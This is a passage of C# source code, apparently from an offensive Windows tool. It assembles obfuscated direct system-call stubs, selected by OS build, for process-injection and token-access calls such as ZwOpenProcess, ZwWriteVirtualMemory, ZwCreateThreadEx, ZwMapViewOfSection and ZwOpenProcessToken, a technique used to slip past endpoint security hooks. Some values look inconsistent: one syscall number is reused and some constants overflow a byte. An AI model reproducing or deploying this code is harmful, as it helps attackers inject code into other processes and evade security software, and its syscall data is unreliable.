                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                        }
                    }
                    break;

                    case 6: // ZwMapViewOfSection
                    unsafe
                    {
                        fixed (byte* ptr = syscall)
                        {
                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0x27);
                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                        }
                    }
                    break;

                    case 7: // ZwCreateProcess
                    unsafe
                    {
                        fixed (byte* ptr = syscall)
                        {
                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0xB3);
                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                        }
                    }
                    break;

                    case 8: // ZwOpenThread
                    unsafe
                    {
                        fixed (byte* ptr = syscall)
                        {
                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0xb3);
                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                        }
                    }
                    break;

                    case 9: // ZwResumeThread
                    unsafe
                    {
                        fixed (byte* ptr = syscall)
                        {
                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0x51);
                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                        }
                   }
                   break;

                   case 10: // ZwOpenProcessToken
                   unsafe
                   {
                       fixed (byte* ptr = syscall)
                       {
                           *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                           *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                           *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                           *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                           *(ptr + 4) = (byte) ( *(ptr + 4) + 0x121);
                           *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                           *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                           *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                           *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                           *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                           *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                       }
                  }
                  break;


              } // switch (sysType)
            } // if
              else
              if (osVersionInfo.dwBuildNumber == 17134)
              {
                switch (sysType)
                {
                    case 1: // ZwOpenProcess
                    unsafe
                    {
                        fixed (byte* ptr = syscall)
                        {
                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0x25);
                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                        }
                    }
                    break;

                    case 2: // ZwCreateThreadEx
                    unsafe
                    {
                        fixed (byte* ptr = syscall)
                        {
                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0xBA);
                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                        }
                    }
                    break;

                    case 3: // ZwWriteVirtualMemory
                    unsafe
                    {
                        fixed (byte* ptr = syscall)
                        {
                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0x39);
                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                        }
                    }
                    break;

                    case 4: // ZwAllocateVirtualMemory
                    unsafe
                    {
                        fixed (byte* ptr = syscall)
                        {
                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0x17);
                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                        }
                    }
                    break;

                    case 5: // ZwCreateSection
                    unsafe
                    {
                        fixed (byte* ptr = syscall)
                        {
                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0x49);
                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                        }
                    }
                    break;

                    case 6: // ZwMapViewOfSection
                    unsafe
                    {
                        fixed (byte* ptr = syscall)
                        {
                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0x27);
                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                        }
                    }
                    break;

                    case 7: // ZwCreateProcess
                    unsafe
                    {
                        fixed (byte* ptr = syscall)
                        {
                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0xB3);
                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                        }
                    }
                    break;

                    case 8: // ZwOpenThread
                    unsafe
                    {
                        fixed (byte* ptr = syscall)
                        {
                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0x126);
                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                        }
                   }
                   break;

                   case 9: // ZwResumeThread
                   unsafe
                   {
                       fixed (byte* ptr = syscall)
                       {
                           *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                           *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                           *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                           *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                           *(ptr + 4) = (byte) ( *(ptr + 4) + 0x51);
                           *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                           *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                           *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                           *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                           *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                           *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                       }
                  }
                  break;

                  case 10: // ZwOpenProcessToken
                  unsafe
                  {
                      fixed (byte* ptr = syscall)
                      {
                          *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
                          *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
                          *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
                          *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
                          *(ptr + 4) = (byte) ( *(ptr + 4) + 0x120);
                          *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
                          *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
                          *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
                          *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
                          *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
                          *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
                      }
                 }
                 break;

               } // switch (sysType)
            }  // if
        }  // Client OS
            else
            if (osVersionInfo.dwPlatformId == 3) // Server OS
            {
            }

            return syscall;
    }




}



```
